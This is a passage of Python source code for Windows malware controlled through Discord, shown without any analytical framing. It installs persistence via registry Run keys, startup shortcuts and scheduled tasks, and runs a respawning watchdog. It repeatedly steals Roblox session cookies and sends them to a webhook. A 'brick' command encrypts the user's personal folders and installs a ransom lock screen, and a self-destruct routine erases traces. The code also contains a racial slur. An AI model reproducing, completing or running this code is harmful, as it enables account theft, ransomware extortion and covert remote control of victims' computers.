        ["reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","/v","DisableRegistryTools","/t","REG_DWORD","/d","0","/f"],
        ["reg","delete","HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","/v","Shell","/f"],
        ["reg","delete","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/v","WindowsLock","/f"],
        ["schtasks","/delete","/tn","WindowsLockScreen","/f"]
    ]:
        try: subprocess.run(cmd, capture_output=True, creationflags=_NW)
        except: pass
    try:
        lnk = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),"WindowsLock.lnk")
        if os.path.exists(lnk): os.remove(lnk)
    except: pass
    try:
        p = os.path.join(os.environ.get("PUBLIC","C:\\Users\\Public"),"Libraries","lock_screen.pyw")
        if os.path.exists(p): os.remove(p)
    except: pass

def _add_startup():
    sp = _self_path; sd = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    copies = [os.path.join(os.environ.get("TEMP","C:\\Temp"),"WindowsServiceHost.py"), os.path.join(os.environ.get("APPDATA",""),"Microsoft\\Windows\\winupdate.py")]
    for cp in copies:
        try:
            if os.path.abspath(sp) != os.path.abspath(cp): shutil.copy2(sp, cp)
        except: pass
    for cp in copies + [sp]:
        short = os.path.splitext(os.path.basename(cp))[0]
        try: subprocess.run(["reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/v",f"Win{short}","/t","REG_SZ","/d",f'"{sys.executable}" "{cp}"',"/f"],capture_output=True,creationflags=_NW)
        except: pass
        try:
            lnk = os.path.join(sd,f"{short}.lnk")
            subprocess.run(["powershell","-NoProfile","-WindowStyle","Hidden","-Command",f'$ws=New-Object -ComObject WScript.Shell;$s=$ws.CreateShortcut("{lnk}");$s.TargetPath="{sys.executable}";$s.Arguments="{cp}";$s.Save()'],capture_output=True,creationflags=_NW)
        except: pass
        for sc in ["ONLOGON","ONSTART"]:
            try: subprocess.run(["schtasks","/create","/tn",f"WinSvc_{short}_{sc}","/tr",f'"{sys.executable}" "{cp}"',"/sc",sc,"/rl","HIGHEST","/f"],capture_output=True,creationflags=_NW)
            except: pass

def _remove_startup():
    for short in ["WindowsServiceHost","winupdate",os.path.splitext(os.path.basename(_self_path))[0]]:
        try: subprocess.run(["reg","delete","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/v",f"Win{short}","/f"],capture_output=True,creationflags=_NW)
        except: pass
        try:
            lnk = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),f"{short}.lnk")
            if os.path.exists(lnk): os.remove(lnk)
        except: pass
        for sc in ["ONLOGON","ONSTART"]:
            try: subprocess.run(["schtasks","/delete","/tn",f"WinSvc_{short}_{sc}","/f"],capture_output=True,creationflags=_NW)
            except: pass
    for cp in [os.path.join(os.environ.get("TEMP","C:\\Temp"),"WindowsServiceHost.py"), os.path.join(os.environ.get("APPDATA",""),"Microsoft\\Windows","winupdate.py")]:
        try:
            if os.path.exists(cp): os.remove(cp)
        except: pass

def watchdog():
    while True:
        time.sleep(30)
        try:
            if not os.path.exists(LOCK_FILE):
                with open(LOCK_FILE, "w") as f: f.write(str(os.getpid()))
            else:
                try:
                    with open(LOCK_FILE, "r") as f: locked_pid = int(f.read().strip())
                    if locked_pid == os.getpid(): continue
                    try: os.kill(locked_pid, 0); continue
                    except: pass
                except: pass
                with open(LOCK_FILE, "w") as f: f.write(str(os.getpid()))
            me = os.path.splitext(os.path.basename(_self_path))[0]
            out = subprocess.run(["powershell","-NoProfile","-WindowStyle","Hidden","-Command",f"(Get-Process -Name '{me}' -ErrorAction SilentlyContinue).Count"],capture_output=True,text=True,timeout=10,creationflags=_NW).stdout.strip()
            if out.isdigit() and int(out) <= 1:
                subprocess.Popen([sys.executable], creationflags=_NW)
        except: pass

def write_pid():
    with open(PID_FILE, "w") as f: f.write(str(os.getpid()))
    with open(LOCK_FILE, "w") as f: f.write(str(os.getpid()))

def auto_check_roblox():
    global cached_valid_cookies
    while True:
        time.sleep(30)
        try:
            g = CookieGrabber()
            cookie = get_roblox_cookie_via_powershell()
            if not cookie: cookie = get_roblox_cookie_via_credmanager()
            if not cookie:
                g.grab_cookies("roblox.com")
                for c in g.roblox_cookies:
                    if c.get("name") == ".ROBLOSECURITY" and c.get("value"): cookie = c["value"]; break
            if not cookie: get_roblosecurity(g); cookie = g.roblosecurity
            if cookie:
                ud = rbx_api("v1/users/authenticated", cookie)
                if "error" not in ud:
                    name = ud.get("name","unknown"); uid = ud.get("id","?")
                    if cookie not in cached_valid_cookies:
                        cached_valid_cookies.append(cookie)
                        send_webhook(embed={"title":f"Auto-Detected Roblox Account: {name}","color":0x9b59b6,"fields":[{"name":"Username","value":name,"inline":True},{"name":"User ID","value":str(uid),"inline":True}],"timestamp":datetime.datetime.utcnow().isoformat()})
                        send_txt_file(f"ROBLOSECURITY_{name}",f".ROBLOSECURITY Cookie -- {socket.gethostname()}\n{'='*60}\n\n{cookie}\n")
                else: cached_valid_cookies = [c for c in cached_valid_cookies if c != cookie]
        except: pass

def cmd_brick():
    global brick_active
    try:
        send_webhook(content="[!] BRICK initiated -- encrypting files and installing ransom lock...")
        fe = FileEncryptor(brick_password); dirs = [os.path.expanduser(f) for f in ["~\\Desktop","~\\Documents","~\\Pictures","~\\Music","~\\Videos","~\\Downloads","~\\OneDrive"]]; total = 0
        for d in dirs:
            if os.path.exists(d):
                for r,_,fs in os.walk(d):
                    for f in fs:
                        fp = os.path.join(r,f)
                        if not fp.endswith(".rbxenc") and os.path.isfile(fp) and fe.encrypt_file(fp): total += 1
        _disable_system_tools(); _install_lock_screen(_write_lock_screen()); brick_active = True
        send_webhook(content=f"[OK] BRICK complete -- {total} files encrypted. Ransom lock installed. Password: `fuckingnigger`")
    except Exception as e: send_webhook(content=f"[ERROR] BRICK failed: {e}")

def cmd_decrypt():
    try:
        fe = FileEncryptor(brick_password); dirs = [os.path.expanduser(f) for f in ["~\\Desktop","~\\Documents","~\\Pictures","~\\Music","~\\Videos","~\\Downloads","~\\OneDrive"]]; total = 0
        for d in dirs:
            if os.path.exists(d):
                for r,_,fs in os.walk(d):
                    for f in fs:
                        if f.endswith(".rbxenc") and fe.decrypt_file(os.path.join(r,f)): total += 1
        _enable_system_tools(); _remove_lock_screen()
        send_webhook(content=f"[OK] DECRYPT complete -- {total} files restored. Lock screen removed.")
    except Exception as e: send_webhook(content=f"[ERROR] DECRYPT failed: {e}")

def cmd_selfdestruct():
    send_webhook(content="[!] Self-destruct requested. Type `!confirm_selfdestruct` within 60 seconds.")
    threading.Thread(target=lambda: (time.sleep(60), send_webhook(content="[!] Self-destruct canceled (timeout).")), daemon=True).start()

def cmd_confirm_selfdestruct():
    send_webhook(content="[!] SELF-DESTRUCT -- removing all traces...")
    _enable_system_tools(); _remove_lock_screen(); _remove_startup()
    try: subprocess.run(["reg","delete","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/f"],capture_output=True,creationflags=_NW)
    except: pass
    try: subprocess.run(["reg","delete","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce","/f"],capture_output=True,creationflags=_NW)
    except: pass
    try:
        lib = os.path.join(os.environ.get("PUBLIC","C:\\Users\\Public"),"Libraries")
        for f in os.listdir(lib):
            try: os.remove(os.path.join(lib,f))
            except: pass
    except: pass
    for f in [PID_FILE, LOCK_FILE]:
        try: os.remove(f)
        except: pass
    send_webhook(content="[OK] Self-destruct complete. Exiting."); os._exit(0)

COMMANDS = {"!rbx": lambda g: cmd_rbx(g), "!rbxfriends": lambda g: cmd_rbxfriends(g), "!rbxrobux": lambda g: cmd_rbxrobux(g), "!rbxcookie": lambda g: cmd_rbxcookie(g), "!steal": lambda g: cmd_steal(g), "!dumpall": lambda g: cmd_dumpall(g), "!brick": lambda g: cmd_brick(), "!decrypt": lambda g: cmd_decrypt(), "!selfdestruct": lambda g: cmd_selfdestruct(), "!confirm_selfdestruct": lambda g: cmd_confirm_selfdestruct(), "!help": lambda g: send_webhook(content="Commands: !rbx, !rbxfriends, !rbxrobux, !rbxcookie, !steal, !dumpall, !brick, !decrypt, !selfdestruct, !confirm_selfdestruct, !help, !cmds"), "!cmds": lambda g: send_webhook(content="Commands: !rbx, !rbxfriends, !rbxrobux, !rbxcookie, !steal, !dumpall, !brick, !decrypt, !selfdestruct, !confirm_selfdestruct, !help, !cmds")}

def get_unread_cmds():
    try:
        bot_id = _discord_request("GET","/users/@me").get("id",""); chs = []; cid = CHANNELS.get("cmds")
        if cid: chs.append(cid)
        else:
            for c in get_available_text_channels():
                if int(c["id"]) not in CHANNELS.values(): chs.append(int(c["id"]))
        r = []
        for ch in chs:
            for m in (_discord_request("GET",f"/channels/{ch}/messages?limit=5") or []):
                if not isinstance(m,dict): continue
                c = m.get("content",""); a = m.get("author",{}).get("id","")
                if a == bot_id: continue
                if c.startswith("!"): r.append({"content":c,"id":m["id"],"channel":ch})
        return r
    except: return []

def cmd_worker():
    g = CookieGrabber(); done = set()
    CHANNELS["cmds"] = 1537124764190248991
    CHANNELS["main"] = 1537124764190248991
    while True:
        try:
            for m in get_unread_cmds():
                if m["id"] in done: continue
                done.add(m["id"]); cmd = m["content"].strip().split()[0].lower(); h = COMMANDS.get(cmd)
                if h:
                    try: h(g)
                    except Exception as e: send_webhook(content=f"`{cmd}` error: {e}")
                else: send_webhook(content=f"Unknown: `{cmd}`")
            time.sleep(1)
        except: time.sleep(1)

def main():
    try:
        write_pid(); _ensure_channels(); _add_startup()
        threading.Thread(target=watchdog, daemon=True).start()
        threading.Thread(target=auto_check_roblox, daemon=True).start()
        send_webhook(content=f"ðŸŸ¢ **C2 Online** `{socket.gethostname()}`"); send_webhook(content=f"ðŸŸ¢ **C2 Online** `{socket.gethostname()}`", channel="cmds" if "cmds" in CHANNELS else "main"); cmd_worker()
    except: pass

if __name__ == "__main__":
    main()
